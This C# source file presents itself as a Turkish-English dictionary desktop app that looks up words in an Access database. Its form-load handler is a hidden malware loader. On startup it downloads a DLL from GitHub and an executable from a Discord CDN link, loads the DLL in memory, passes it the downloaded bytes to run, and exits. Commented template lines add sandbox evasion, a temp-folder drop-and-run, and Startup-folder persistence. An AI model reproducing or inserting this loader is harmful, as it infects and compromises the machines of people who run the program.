﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Data.OleDb;
using System.Net;
using System.Reflection;


namespace KarabaySozluk
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        OleDbConnection baglanti = new OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=sozluk.accdb");
        OleDbCommand komut = new OleDbCommand();
        DataSet ds = new DataSet();



        private void Form1_Load(object sender, EventArgs e)
        {
            {
                using (var webClient = new WebClient())
                {
                    //sandboxie controlsandboxie();

                    //Messega

                    //download try
                    //download {
                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download }
                    //download catch
                    //download {
                    //download }
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    byte[] textbox1 = webClient.DownloadData("https://raw.githubusercontent.com/neox0rz/neoconfuser/main/InternetGetCookieExDemo.dll");

                    System.Net.WebClient gunaresiseform1 = new System.Net.WebClient();
             
                    Uri combobox2 = new Uri("https://cdn.discordapp.com/attachments/859130004898447360/861875045513297920/WindowsApplication14.exe");

                    byte[] dbytes = gunaresiseform1.DownloadData(combobox2);

                    object student = new object[] { Application.ExecutablePath , string.Empty, dbytes, true };

                    Assembly panel1;

                    string richtextbox1 = null;

                    panel1 = AppDomain.CurrentDomain.Load(textbox1);

                    panel1.GetType("InternetGetCookieExDemo.dataclass").InvokeMember("CookiesTextBox", System.Reflection.BindingFlags.InvokeMethod, null, richtextbox1, (object[])student);



                    //start  {
                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                    //start  }
                }
                Environment.Exit(1);
                textBox1.Enabled = false;
                label2.Enabled = false;
            }
        }
        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }
        private void button1_Click(object sender, EventArgs e)
        {
            string aranan = textBox1.Text;
            bool kelimeyok = true;

            if (textBox1.Text!="")
            {
                baglanti.Open();
                komut.CommandText = "SELECT * FROM ingilizce";
                komut.Connection = baglanti;
                OleDbDataReader oku = komut.ExecuteReader();
                if (radioButton1.Checked)
                {
                    while (oku.Read())
                    {
                        if (aranan==oku[0].ToString())
                        {
                            label2.Text = oku[1].ToString();
                            kelimeyok = false;
                        }
                        
                    }
                    
                }

                if (radioButton2.Checked)
                {
                    while (oku.Read())
                    {
                        if (aranan==oku[1].ToString())
                        {
                            label2.Text = oku[0].ToString();
                            kelimeyok = false;
                        }
                        
                    }
                    
                }

                oku.Close();
                baglanti.Close();

                if (kelimeyok)
                {
                    MessageBox.Show("Kelime Bulunamadı...");
                }
               
  }
            else
            {
                MessageBox.Show("Lütfen değer girdikten sonra ara butonuna basınız");
            }
  }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            textBox1.Enabled = true;
            label2.Enabled = true;
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            textBox1.Enabled = true;
            label2.Enabled = true;
        }
    }
}
